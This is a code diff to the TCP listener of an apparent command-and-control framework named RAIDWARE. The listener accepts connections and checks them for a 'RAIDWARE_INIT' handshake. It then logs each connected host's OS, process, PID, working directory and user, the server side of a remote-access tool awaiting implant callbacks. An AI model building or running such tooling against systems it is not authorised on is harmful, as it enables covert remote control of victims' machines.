@@ -30,6 +30,7 @@ class Listener(BaseListener):
         self.sock = socket(AF_INET, SOCK_STREAM)
         self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
         self.thread = None
+        self.bind = 0
 
         self.rcvd = {}
 
@@ -52,45 +53,51 @@ class Listener(BaseListener):
 
 
     def __listen__(self):
-
+        
         def __verify__(conn : socket):
             print()
             log_info("A connection has been received. Verifying the connection...")
-            uid = create_new_UID()
+            uid = get_random_string()
             self.onSend(uid, socket=conn)
             recv = self.onRecv(socket=conn).split('|')
             try:
-                return recv[0] == "RAIDWARE_INIT", recv[1], uid
+                return (recv[0] == "RAIDWARE_INIT"), recv[1], uid, recv[2], recv[3], recv[4], recv[5]
             except:
                 return None
 
-        try:
-            self.sock.bind((self.ip_addr, self.port))
-        except:
-            log_error("([GREEN]TCP[RESET]) Failed to bind to the specified address and port.")
-            self.sock = None
+        if not self.bind:
+            try:
+                self.sock.bind((self.opts['LHOST'], self.opts['LPORT']))
+                self.bind = 1
+            except Exception as E:
+                log_error(f"Exception: {E}")
+                log_error("([GREEN]TCP[RESET]) Failed to bind to the specified address and port.")
+                self.sock = None
 
         if self.sock == None:
             log_error("([GREEN]TCP[RESET]) An error had occurred when creating the socket for listener. Please check...")
             return
 
         self.sock.listen()
-        log_info(f"([GREEN]TCP[RESET]) Listening on [CYAN]{self.ip_addr}[RESET]:[CYAN]{self.port}[RESET]")
-
-        enabled_Listeners[create_new_UID()] = self
+        log_info(f"([GREEN]TCP[RESET]) Listening on [CYAN]{self.opts['LHOST']}[RESET]:[CYAN]{self.opts['LPORT']}[RESET]")
 
         while True:
             conn, addr = self.sock.accept()
 
             ''' Verifying the received connection... '''
             ret = __verify__(conn)
+
+            if not ret:
+                log_error("Connection was received but we were unable to validate if it was our own.")
+                continue
+
             if not ret[0]:
                 log_error("Connection was received but we were unable to validate if it was our own.")
                 continue
 
             log_info(f"([GREEN]TCP[RESET]) Received a connection from {addr[0]}:{addr[1]}")
             print()
-            connections[ret[1]] = Connection(UID=ret[2], listener=self, _type=self.type, base=conn, OS=ret[1])
+            connections[ret[2]] = Connection(UID=ret[2], listener=self, _type=self.type, base=conn, OS=ret[1], proc = ret[3], pid = ret[4], pwd = ret[5], user = ret[6])
 
     def __help__(self):
         self.__options__()
@@ -201,5 +208,9 @@ class Listener(BaseListener):
             log_error(f"Connection lost...")
             return None
 
-        buf = buf.split(self.BEGIN_DEL)[1].split(self.DELIMITER)[0][1:]
-        return buf[:-1]
+        try:
+            buf = buf.split(self.options['begin-delimiter'])[1].split(self.options['end-delimiter'])[0][1:]
+        except:
+            log_error(f"Received data: {buf}")
+            log_error("Unable to parse the received data. Returning the raw data...")
+            return buf
